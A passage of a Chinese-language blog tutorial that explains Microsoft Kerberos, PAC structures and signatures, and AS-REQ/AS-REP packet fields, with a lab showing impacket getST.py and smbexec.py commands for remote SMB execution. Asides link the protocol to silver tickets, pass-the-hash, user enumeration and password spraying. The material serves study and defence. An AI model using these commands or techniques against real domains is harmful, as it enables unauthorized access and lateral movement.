Center：密钥分发中心，由域控担任</td></tr><tr><td>AD</td><td>Active Directory：活动目录，里面包含域内用户数据库</td></tr><tr><td>AS</td><td>Authentication Service：认证服务</td></tr><tr><td>TGT</td><td>Ticket Granting Ticket：TGT认购权证，由KDC的AS认证服务发放</td></tr><tr><td>TGS</td><td>Ticket Granting Service：票据授予服务</td></tr><tr><td>ST</td><td>Service Ticket：ST服务票据，由KDC的TGS票据授予服务发放</td></tr></tbody></table><p>表1-1 名词简称及含义</p><p>Kerberos协议有两个基础认证模块：AS_REQ &amp; AS_REP 和 TGS_REQ &amp; TGS_REP ，以及微软扩展的两个认证模块 S4U 和 PAC 。S4U是微软为了实现委派而扩展的模块，分为 S4U2Self 和 S4U2Proxy 。在Kerberos最初设计的流程里只说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。因此微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。</p><p>在分析AS_REQ &amp; AS_REP 和 TGS_REQ &amp; TGS_REP之前，我们先来看看什么是PAC。</p><h1 id="PAC特权属性证书"><a href="#PAC特权属性证书" class="headerlink" title="PAC特权属性证书"></a>PAC特权属性证书</h1><p>PAC (Privilege Attribute Certificate，特权属性证书)，其中所包含的是各种授权信息、附加凭据信息、配置文件和策略信息等。例如用户所属的用户组， 用户所具有的权限等。在最初的RFC1510中规定的标准Kerberos认证过程中并没有PAC，微软在自己的产品中所实现的Kerberos流程加入了PAC的概念，因为在域中不同权限的用户能够访问的资源是不同的，因此微软设计PAC用来辨别用户身份和权限。</p><p>在一个正常的Kerberos认证流程中，KDC返回的TGT认购权证和ST服务票据中都是带有PAC的。这样做的好处就是在以后对资源的访问中， 服务端再接收到客户请求的时候不再需要借助KDC的帮助提供完整的授权信息来完成对用户权限的判断， 而只需要根据请求中所包含的PAC信息直接与本地资源的ACL相比较做出裁决。</p><h2 id="1-PAC结构"><a href="#1-PAC结构" class="headerlink" title="1. PAC结构"></a>1. PAC结构</h2><p>PAC的顶部结构如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">typedef unsigned <span class="token builtin">long</span> ULONG<span class="token punctuation">;</span>typedef unsigned short USHORT<span class="token punctuation">;</span>typedef unsigned long64 ULONG64<span class="token punctuation">;</span>typedef unsigned char UCHAR<span class="token punctuation">;</span>typedef struct _PACTYPE <span class="token punctuation">&#123;</span>    ULONG cBuffers<span class="token punctuation">;</span>    ULONG Version<span class="token punctuation">;</span>                             PAC_INFO_BUFFER Buffers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> PACTYPE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些顶部字段的定义如下：</p><ul><li>cBuffers：包含数组缓冲区中的条目数。</li><li>Version：版本</li><li>Buffers：包含一个PAC_INFO_BUFFER结构的数组。</li></ul><p>如图所示，是WireShark抓包的PAC结构部分，可以看到cBuffers、Version和Buffers部分：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640162654479-f0aaf4e2-aeee-4630-beac-7a9bddf294fa.png" alt="img"></p><p>而PAC_INFO_BUFFER结构包含了关于PAC的每个部分的信息，这部分是最重要的，结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PAC_INFO_BUFFER</span> <span class="token punctuation">&#123;</span>    ULONG ulType<span class="token punctuation">;</span>    ULONG cbBufferSize<span class="token punctuation">;</span>    ULONG64 Offset<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> PAC_INFO_BUFFER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类型字段的定义如下：</p><ul><li><p><strong>ulType</strong>：包含此缓冲区中包含的数据的类型。它可能是以下之一：</p></li><li><ul><li>Logon Info (1)</li><li>Client Info Type（10）</li><li>UPN DNS Info (12)</li><li>Sserver Cechksum (6)</li><li>Privsvr Cechksum (7)</li></ul></li><li><p><strong>cbBufferSize</strong>：缓冲大小</p></li><li><p><strong>Offset</strong>：缓冲偏移量</p></li></ul><p>如图所示，是WireShark抓包的PAC_INFO_BUFFER结构部分。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640163077278-99fc87f0-7b88-4b58-bdc6-d5f2a4121fbf.png" alt="img"></p><h2 id="2-PAC凭证信息"><a href="#2-PAC凭证信息" class="headerlink" title="2. PAC凭证信息"></a>2. PAC凭证信息</h2><p>LOGON INFO类型的PAC_LOGON_INFO包含Kerberos票据客户端的凭据信息。数据本身包含在一个KERB_VALIDATION_INFO结构中，该结构是由NDR编码的。NDR编码的输出被放置在LOGON INFO类型的PAC_INFO_BUFFER结构中。如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_KERB_VALIDATION_INFO</span> <span class="token punctuation">&#123;</span>    FILETIME Reserved0<span class="token punctuation">;</span>    FILETIME Reserved1<span class="token punctuation">;</span>    FILETIME KickOffTime<span class="token punctuation">;</span>    FILETIME Reserved2<span class="token punctuation">;</span>    FILETIME Reserved3<span class="token punctuation">;</span>    FILETIME Reserved4<span class="token punctuation">;</span>    UNICODE_STRING Reserved5<span class="token punctuation">;</span>    UNICODE_STRING Reserved6<span class="token punctuation">;</span>    UNICODE_STRING Reserved7<span class="token punctuation">;</span>    UNICODE_STRING Reserved8<span class="token punctuation">;</span>    UNICODE_STRING Reserved9<span class="token punctuation">;</span>    UNICODE_STRING Reserved10<span class="token punctuation">;</span>    USHORT Reserved11<span class="token punctuation">;</span>    USHORT Reserved12<span class="token punctuation">;</span>    ULONG UserId<span class="token punctuation">;</span>    ULONG PrimaryGroupId<span class="token punctuation">;</span>    ULONG GroupCount<span class="token punctuation">;</span>    <span class="token punctuation">[</span><span class="token function">size_is</span><span class="token punctuation">(</span>GroupCount<span class="token punctuation">)</span><span class="token punctuation">]</span> PGROUP_MEMBERSHIP GroupIds<span class="token punctuation">;</span>    ULONG UserFlags<span class="token punctuation">;</span>    ULONG Reserved13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    UNICODE_STRING Reserved14<span class="token punctuation">;</span>    UNICODE_STRING Reserved15<span class="token punctuation">;</span>    PSID LogonDomainId<span class="token punctuation">;</span>    ULONG Reserved16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG Reserved17<span class="token punctuation">;</span>    ULONG Reserved18<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG SidCount<span class="token punctuation">;</span>    <span class="token punctuation">[</span><span class="token function">size_is</span><span class="token punctuation">(</span>SidCount<span class="token punctuation">)</span><span class="token punctuation">]</span> PKERB_SID_AND_ATTRIBUTES ExtraSids<span class="token punctuation">;</span>    PSID ResourceGroupDomainSid<span class="token punctuation">;</span>    ULONG ResourceGroupCount<span class="token punctuation">;</span>    <span class="token punctuation">[</span><span class="token function">size_is</span><span class="token punctuation">(</span>ResourceGroupCount<span class="token punctuation">)</span><span class="token punctuation">]</span> PGROUP_MEMBERSHIP ResourceGroupIds<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> KERB_VALIDATION_INFO<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要还是关注以下几个字段：</p><ul><li>Acct Name：该字段对应的值是用户sAMAccountName属性的值</li><li>Full Name：该字段对应的值是用户displayName属性的值</li><li>User RID：该字段对应的值是用户的RID，也就是用户SID的最后部分</li><li>Group RID：对于该字段，域用户的Group RID恒为513(也就是Domain Users的RID)，机器用户的Group RID恒为515(也就是Domain Computers的RID)，域控的Group RID恒为516(也就是Domain Controllers的RID)</li><li>Num RIDS：用户所属组的个数</li><li>GroupIDS：用户所属的所有组的RID</li></ul><p>如图所示，是是WireShark抓包的PAC_LOGON_INFO部分。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640163846501-769dfbf2-074c-4791-a716-4b78a0d5e8d6.png" alt="img"></p><h2 id="3-PAC签名"><a href="#3-PAC签名" class="headerlink" title="3. PAC签名"></a>3. PAC签名</h2><p>PAC中包含两个数字签名：PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM。PAC_SERVER_CHECKSUM是使用服务密钥进行签名，而PAC_PRIVSVR_CHECKSUM是使用KDC密钥进行签名。签名有两个原因。首先，存在带有服务密钥的签名，以验证此PAC由服务进行了签名。其次，带有KDC密钥的签名是为了防止不受信任的服务用无效的PAC为自己伪造票据。这两个签名分别以PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM类型的PAC_INFO_BUFFER发送。在PAC数据用于访问控制之前，必须检查PAC_SERVER_CHECKSUM签名。这将验证客户端是否知道服务的密钥。而PAC_PRIVSVR_CHECKSUM签名的验证是可选的，默认不开启。它用于验证PAC是否由KDC签发，而不是由KDC以外的具有访问服务密钥的人放入票据中。</p><p>签名包含在以下结构中：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">typedef struct _PAC_SIGNATURE_DATA <span class="token punctuation">&#123;</span>    ULONG SignatureType<span class="token punctuation">;</span>    UCHAR Signature<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> PAC_SIGNATURE_DATA<span class="token punctuation">,</span> <span class="token operator">*</span>PPAC_SIGNATURE_DATA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这些字段定义如下：</p><ul><li>SignatureType：此字段包含用于创建签名的校验和的类型，校验和必须是一个键控的校验和。</li><li>Signature：此字段由一个包含校验和数据的字节数组组成。字节的长度可以由包装PAC_INFO_BUFFER结构来决定。</li></ul><p>如图所示，是PAC中的签名部分，可以看到PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640057437469-9cdddc39-ad58-4d52-96a6-a67c9b26492b.png" alt="img"></p><h2 id="4-KDC验证PAC"><a href="#4-KDC验证PAC" class="headerlink" title="4. KDC验证PAC"></a>4. KDC验证PAC</h2><p>我们注意到，PAC中是有两个签名的：PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM。一个是使用服务密钥(PAC_SERVER_CHECKSUM)进行签名，另一个使用KDC密钥(PAC_PRIVSVR_CHECKSUM)进行签名。当服务端收到客户端发来的AP-REQ消息时，只能校验PAC_SERVER_CHECKSUM签名，而并不能校验PAC_PRIVSVR_CHECKSUM签名。因此，正常来说如果需要校验PAC_PRIVSVR_CHECKSUM签名的话，服务端还需要将客户端发来的ST服务票据中的PAC签名发给KDC进行校验。但是，由于大部分服务默认并没有KDC验证PAC这一步(需要将目标服务主机配置为验证KDC PAC签名，默认未开启)，因此服务端就无需将ST服务票据中的PAC签名发给KDC校验了。这也是白银票据攻击能成功的前提，因为如果配置了需要验证PAC_PRIVSVR_CHECKSUM签名的话，服务端会将这个PAC的数字签名以KRB_VERIFY_PAC的消息通过RPC协议发送给KDC，KDC再将验证这个PAC的数字签名的结果以RPC返回码的形式发送给服务端，服务端就可以根据这个返回结果判断PAC的真实性和有效性了。 因此如果目标服务主机配置了要校验PAC_PRIVSVR_CHECKSUM签名的话，就算攻击者拥有服务密钥，可以制作ST服务票据，也不能伪造KDC的PAC_PRIVSVR_CHECKSUM签名，自然就无法通过KDC的签名校验了。</p><p>那么如何配置服务主机开启KDC签名校验呢，根据微软官方文档的描述，若要开启KDC校验PAC，需要有以下条件：</p><ul><li>应用程序具有SeTcbPrivilege权限。SeTcbPrivilege权限允许为用户帐户分配“作为操作系统的一部分”。本地系统、网络服务和本地服务帐户都是由windows定义的服务用户帐户。每个帐户都有一组特定的特权。</li><li>应用程序是一个服务，验证KDC PAC签名的注册表项被设置为1，默认为0。修改方法如下：</li></ul><ol><li><ol><li>启动注册表编辑器regedit.exe</li><li>找到以下子键：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</li><li>添加一个ValidateKdcPacSignature的键值(DWORD类型)。该值为0时，不会进行KDC PAC校验。该值为1时，会进行KDC PAC校验。因此可以将该值设置为1启用KDC PAC校验。</li></ol></li></ol><p>对于验证KDC PAC签名这个注册表键值，有以下几点注意事项：</p><ul><li>如果服务端并非一个服务程序，而是一个普通应用程序，它将不受以上注册表的影响，而总是进行KDC PAC校验。</li><li>如果服务端并非一个程序，而是一个驱动，其认证过程在系统内核内完成，它将不受以上注册表的影响，而永不进行PAC校验。</li><li>使用以上注册表项，需要在Windows Server 2003 SP2或更新的操作系统。</li><li>在运行Windows Server 2008或更新操作系统的服务器上，该注册表项的值缺省为0(默认没有该ValidateKdcPacSignature键值)，也就是不进行KDC PAC校验。</li></ul><p>注：需要说明的是，注册在本地系统帐户下的服务无论如何配置，都不会触发KDC验证PAC签名。也就是说譬如SMB、CIFS、HOST等服务无论如何都不会触发KDC验证PAC签名。</p><p><strong>那么为什么默认情况下，KDC都不会验证PAC的签名呢？</strong></p><p>执行KDC验证PAC的话，意味着在响应时间和带宽使用方面的成本。它需要带宽使用来在应用服务器和KDC之间传输请求和响应。这可能会导致大容量应用程序服务器中出现一些性能问题。在这样的环境中，用户身份验证可能会导致额外的网络延迟和大量的流量。因此，默认情况下，KDC不验证PAC签名。</p><h2 id="5-PAC在kerberos中的优缺点"><a href="#5-PAC在kerberos中的优缺点" class="headerlink" title="5. PAC在kerberos中的优缺点"></a>5. PAC在kerberos中的优缺点</h2><p>那么PAC的存在究竟给我们的验证过程带来了哪些优点，亦或是缺点呢？</p><p>正如上面所提到的那样，PAC的引入其实带来了很多的优点。客户端在访问网络资源的时候服务端不再需要向KDC查询授权信息， 而是直接在本地进行PAC信息与ACL的比较。从而节约了网络资源。</p><p>如图所示， 在没有PAC的情况下，Server与KDC之间必须进行用户授权信息的查询与返回 ：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1651294084649-06808eb8-56ad-46c0-95ef-3217c1bf0135.png" alt="img"></p><p>当引入PAC之后则变成了如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1651294297477-5e62c667-cd5e-496e-8bf7-4e52b627e241.png" alt="img"></p><p>但是，PAC的引入并不是百利而无一害的，PAC在用户的认证阶段引入会导致认证耗时过长。Windows Kerberos客户端会通过RPC调用KDC上的函数来验证PAC信息，这时候用户会观察到在服务器端与KDC之间的RPC包流量的增加。而另一方面， 由于PAC是微软特有的一个特性，所以启用了PAC的域中将不支持装有其他操作系统的服务器， 制约了域配置的灵活性。并且在2014年，由于PAC的安全性导致产生了一个域内极其严重的提权漏洞MS14-068(在后面的文章中我们会介绍这个漏洞)。</p><h1 id="Kerberos实验"><a href="#Kerberos实验" class="headerlink" title="Kerberos实验"></a>Kerberos实验</h1><p>为了更直观的分析Kerberos协议，接下来我们用普通域帐户xie&#x2F;hack使用impacket工具请求win10机器的cifs服务票据 ，然后远程SMB连接，在该过程中使用WireShark进行抓包。</p><p>实验环境如下：</p><ul><li>用户(xie&#x2F;hack)：10.211.55.2</li><li>域内主机(Win10)： 10.211.55.16</li><li>域控(AD01)： 10.211.55.4</li></ul><p>impacket使用命令如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#使用hack账号密码请求win10的cifs服务的ST服务票据</span>python3 getST<span class="token punctuation">.</span>py <span class="token operator">-</span>dc<span class="token operator">-</span>ip <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.4</span> <span class="token operator">-</span>spn cifs<span class="token operator">/</span>win10<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com xie<span class="token punctuation">.</span>com<span class="token operator">/</span>hack<span class="token punctuation">:</span>P@ss1234<span class="token comment">#导入该ST服务票据</span>export KRB5CCNAME<span class="token operator">=</span>hack<span class="token punctuation">.</span>ccache<span class="token comment">#使用smb远程连接win10</span>python3 smbexec<span class="token punctuation">.</span>py <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span> <span class="token operator">-</span>k win10<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图所示，可以看到在请求了服务票据后，成功远程SMB连接win10机器。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640001039794-8da39219-a008-4699-a6f7-be9dd586621a.png" alt="img"></p><p>在这个过程中，我们使用WireShark抓包，来进一步的分析Kerberos协议。如图所示，是该过程的抓包图：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640512858572-322481e7-cdaf-49cd-a853-6df327988120.png" alt="img"></p><p>整个Kerberos认证流程如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1642049310305-81d7a26e-f42e-4e16-a216-fde122ab0291.png" alt="img"></p><p>下面我们来具体分析Kerberos认证流程的每个步骤：</p><h1 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS-REQ &amp; AS-REP"></a>AS-REQ &amp; AS-REP</h1><p>我们先来看看AS-REQ&amp;AS-REP请求部分，也就是WireShark抓的第一、二个包，如图所示：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640001161994-d7e6c558-7fc0-4dd7-ba2e-f3ae36f993d0.png" alt="img"></p><p>如图所示，是一个简易的AS-REQ&amp;AS-REP请求过程图，便于我们直观的了解AS-REQ&amp;AS-REP请求过程。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640514282670-4651e031-5d9c-4d21-a948-13bd56194e71.png" alt="img"></p><p>下面让我们具体的分析下AS-REQ&amp;AS-REP过程中的数据包细节：</p><p>首先，我们来看看客户端是如何获得TGT认购权证的。TGT认购权证是由KDC的 AS（Authentication Service） 认证服务发放的。</p><h2 id="1-AS-REQ请求包分析"><a href="#1-AS-REQ请求包分析" class="headerlink" title="1. AS-REQ请求包分析"></a>1. AS-REQ请求包分析</h2><p>AS-REQ：当域内某个用户想要访问域内某个服务时，于是输入用户名和密码，本机就会向KDC的AS认证服务发送一个AS-REQ认证请求。该请求包中包含如下信息： </p><ul><li>请求的用户名(cname)。</li><li>域名(realm)。</li><li>Authenticator：一个抽象的概念，代表一个验证。这里是用户密钥加密的时间戳。</li><li>请求的服务名(sname)：AS-REQ这个阶段请求的服务都是krbtgt。</li><li>加密类型(etype)。</li><li>以及一些其他信息：如版本号，消息类型，票据有效时间，是否包含PAC，协商选项等。</li></ul><p>如图所示，是AS-REQ请求包的详细：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640001911364-ebe245f6-7f0f-46e6-862f-c6c5fa8b9549.png" alt="img"></p><p>下面我们来看看AS-REQ请求包中每个字段的含义，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno<span class="token punctuation">:</span> kerberos版本号<span class="token punctuation">,</span>这里为<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> 消息类型<span class="token punctuation">,</span> AS_REQ 对应的是 krb<span class="token operator">-</span><span class="token keyword">as</span><span class="token operator">-</span>req<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>padata：主要是一些认证信息，每个认证消息有<span class="token builtin">type</span>和value。  PA<span class="token operator">-</span>DATA PA<span class="token operator">-</span>ENC<span class="token operator">-</span>TIMESTAMP：这个是预认证，就是用用户Hash加密时间戳，作为value发送给KDC的AS服务。然后KDC从活动目录中查询出用户的<span class="token builtin">hash</span>，使用用户Hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过。由于是使用用户密码Hash加密的时间戳，所以也就造成了哈希传递攻击    padata<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> padata类型<span class="token punctuation">,</span>这里是 pA<span class="token operator">-</span>ENC<span class="token operator">-</span>TIMESTAMP<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>      padata<span class="token operator">-</span>vaule<span class="token punctuation">:</span> 加密后的值        etype<span class="token punctuation">:</span>  加密类型，这里是 eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>        cipher<span class="token punctuation">:</span> 密钥  PA<span class="token operator">-</span>DATA PA<span class="token operator">-</span>PAC<span class="token operator">-</span>REQUEST：这个是启用PAC支持的扩展。这里的value对应的值为<span class="token boolean">True</span>或<span class="token boolean">False</span><span class="token punctuation">,</span>KDC根据include的值来确定返回的票据中是否需要携带PAC。    padata<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> padata类型<span class="token punctuation">,</span>这里是pA<span class="token operator">-</span>PAC<span class="token operator">-</span>REQUEST<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>      padata<span class="token operator">-</span>vaule<span class="token punctuation">:</span> padata的值        include<span class="token operator">-</span>pac<span class="token punctuation">:</span> 是否包含PAC<span class="token punctuation">,</span>这里为<span class="token boolean">True</span><span class="token punctuation">,</span>说明要PACreq<span class="token operator">-</span>body：请求body    padding<span class="token punctuation">:</span>填充<span class="token punctuation">,</span>这里为<span class="token number">0</span>    kdc<span class="token operator">-</span>options<span class="token punctuation">:</span>用于与KDC协商一些选项设置    reservedforwardable forwarded proxiable proxy allow<span class="token operator">-</span>postdate postdated unused7 renewable unused9 unused10 opt<span class="token operator">-</span>hardware<span class="token operator">-</span>auth unused12 unused13 constrained<span class="token operator">-</span>delegation canonicalize  request<span class="token operator">-</span>anonymous unused17 unused18 unused19 unused20 unused21 unused22 unused23 unused24 unused25 disable<span class="token operator">-</span>transited<span class="token operator">-</span>check renewable<span class="token operator">-</span>ok enc<span class="token operator">-</span>tkt<span class="token operator">-</span><span class="token keyword">in</span><span class="token operator">-</span>skey unused29 renew validate    cname：请求的用户名<span class="token punctuation">,</span>这个用户名存在和不存在，返回的包有差异，因此可以用于枚举域内用户名。并且当用户名存在，密码正确和错误时，返回包也不一样，因此也可以进行密码喷洒。      name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>名字类型，这里是KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>PRINCIPAL<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      cnmae<span class="token operator">-</span>string<span class="token punctuation">:</span>名字，也就是请求的用户名        CNameString<span class="token punctuation">:</span> 请求的用户名，这里为 hack    realm<span class="token punctuation">:</span>域名，这里为XIE<span class="token punctuation">.</span>COM    sname：请求的服务，包含<span class="token builtin">type</span>和Value。在AS<span class="token operator">-</span>REQ里面sname始终为krbtgt      name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>名字类型，这里是KRB5<span class="token operator">-</span>NT<span class="token operator">-</span>PRINCIPAL<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      sname<span class="token operator">-</span>string<span class="token punctuation">:</span> krbtgt用户的信息<span class="token punctuation">,</span>这里有<span class="token number">2</span>个items        SNameString<span class="token punctuation">:</span> 这里是krbtgt用户名        SNameString<span class="token punctuation">:</span> 这里是域名XIE<span class="token punctuation">.</span>COM    till<span class="token punctuation">:</span>到期时间    rtime：也是到期时间    nonce：随机生成的一个数    etype：加密类型      ENCTYPE<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们着重讲一下PA-DATA PA-ENC-TIMESTAMP字段，该字段是用于预认证。</p><p>在AS-REQ请求包中，只有PA-DATA PA-ENC-TIMESTAMP部分是加密的，这一部分属于预认证，我们称这部分为<strong>Authenticator。</strong>如图所示，在impacket&#x2F;krb5&#x2F;kerberosv5.py中可以看到使用用户的密码Hash或用户的密码AES Key来加密时间戳。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640760630558-07e65725-41bb-4e00-8f36-c527eeeaba8f.png" alt="img"></p><p>对WireShark抓取的流量进行解密，如图所示，可以看到这里是使用hack用户的密钥来解密该值，如下的patimestamp和pauses是解密后的值。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640054631632-4e60d763-8af2-4f93-9ef2-3237bbf0a875.png" alt="img"></p><h2 id="2-AS-REP回复包分析"><a href="#2-AS-REP回复包分析" class="headerlink" title="2. AS-REP回复包分析"></a>2. AS-REP回复包分析</h2><p>AS-REP：当KDC的AS认证服务接收到客户端发来的AS-REQ请求后，从活动目录数据库中取出该用户的密钥，然后用该密钥对请求包中的Authenticator预认证部分进行解密，如果解密成功，并且时间戳在有效的范围内，则证明请求者提供的用户密钥正确。KDC的AS认证服务在成功认证客户端的身份之后，发送AS-REP响应包给客户端。AS-REP响应包中主要包括如下信息：</p><ul><li>请求的用户名(cname)。</li><li>域名(crealm)。</li><li>TGT认购权证：包含明文的版本号，域名，请求的服务名，以及加密部分enc-part。加密部分用krbtgt密钥加密。加密部分包含Logon Session Key、用户名、域名、认证时间、认证到期时间和authorization-data。authorization-data中包含最重要的PAC特权属性证书(包含用户的RID，用户所在组的RID) 等。</li><li>enc_Logon Session Key：使用用户密钥加密Logon Session Key后的值，其作用是用于确保客户端和KDC下阶段之间通信安全。也就是AS-REP中最外层的enc-part。</li><li>以及一些其他信息：如版本号，消息类型等。</li></ul><p>如图所示，是AS-REP回复包的详细：</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640054841346-cb4ea58c-cda0-434b-a3be-9f41a7bc58d0.png" alt="img"></p><p>下面我们来看看AS-REP回复包中每个字段的含义，如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pvno<span class="token punctuation">:</span>kerberos版本号<span class="token punctuation">,</span>这里为<span class="token number">5</span>msg<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span>消息类型<span class="token punctuation">,</span>AS_REP对应的是 krb<span class="token operator">-</span><span class="token keyword">as</span><span class="token operator">-</span>rep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>padata：主要是一些认证信息。一个列表，包含若干个认证消息用于认证  PA<span class="token operator">-</span>DATA PA<span class="token operator">-</span>ENCTYPE<span class="token operator">-</span>INFO2    padata<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> padata的类型，这里是 pA<span class="token operator">-</span>ETYPE<span class="token operator">-</span>INFO2<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>    padata<span class="token operator">-</span>value<span class="token punctuation">:</span> 加密后的值      ETYPE<span class="token operator">-</span>INFO2<span class="token operator">-</span>ENTRY         etype<span class="token punctuation">:</span> eTYPE<span class="token operator">-</span>AES256<span class="token operator">-</span>CTS<span class="token operator">-</span>HMAC<span class="token operator">-</span>SHA1<span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>         salt<span class="token punctuation">:</span> 盐值，这里是 XIE<span class="token punctuation">.</span>COMhackcrealm<span class="token punctuation">:</span> 域名<span class="token punctuation">,</span>这里是XIE<span class="token punctuation">.</span>COMcname：请求的用户名  name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> 用户名类型，这里是 kRB5<span class="token operator">-</span>NT<span class="token operator">-</span>PRINCIPAL<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  cname<span class="token operator">-</span>string<span class="token punctuation">:</span> 1item    CNameString<span class="token punctuation">:</span> hackticket：TGT认购权证  tkt<span class="token operator">-</span>vno<span class="token punctuation">:</span> TGT版本号，这里为<span class="token number">5</span>  realm<span class="token punctuation">:</span> 域名，这里是 XIE<span class="token punctuation">.</span>COM  sname<span class="token punctuation">:</span> 服务用户名，这里是krbtgt 密码分发中心服务账号    name<span class="token operator">-</span><span class="token builtin">type</span><span class="token punctuation">:</span> KRB5<span 